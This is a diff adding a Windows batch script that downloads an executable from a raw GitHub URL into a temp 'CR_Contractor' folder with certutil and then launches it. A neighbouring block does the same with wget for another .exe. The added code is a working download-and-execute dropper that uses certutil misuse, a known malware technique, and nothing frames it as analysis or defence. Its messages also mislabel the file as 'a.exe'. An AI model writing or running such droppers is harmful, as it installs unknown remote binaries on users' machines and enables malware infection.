@@ -16,6 +16,45 @@ exit
 ----
 
 @echo off
+set "download_dir=C:\Temp\CR_Contractor\Files"
+set "file_path=%download_dir%\hh.exe"
+set "url=https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/HH.exe"
+
+:: Create directory if it doesn't exist
+if not exist "%download_dir%" (
+    mkdir "%download_dir%"
+    if %ERRORLEVEL% NEQ 0 (
+        echo Failed to create directory %download_dir%
+        pause
+        exit /b
+    )
+)
+
+echo Downloading a.exe to %file_path%...
+certutil -urlfetch -f "%url%" "%file_path%" >nul
+if %ERRORLEVEL% NEQ 0 (
+    echo Failed to download a.exe
+    pause
+    exit /b
+)
+
+echo Executing a.exe...
+start /wait "" "%file_path%"
+if %ERRORLEVEL% NEQ 0 (
+    echo Failed to execute a.exe
+    pause
+    exit /b
+)
+
+:: Pause to keep the cmd window open
+pause
+exit
+
+
+
+----
+
+@echo off
 wget -O PERFECT_PLAYGROUND.exe https://raw.githubusercontent.com/krizza72/Pub_ex/refs/heads/main/PERFECT_PLAYGROUND.exe
 start PERFECT_PLAYGROUND.exe
 pause
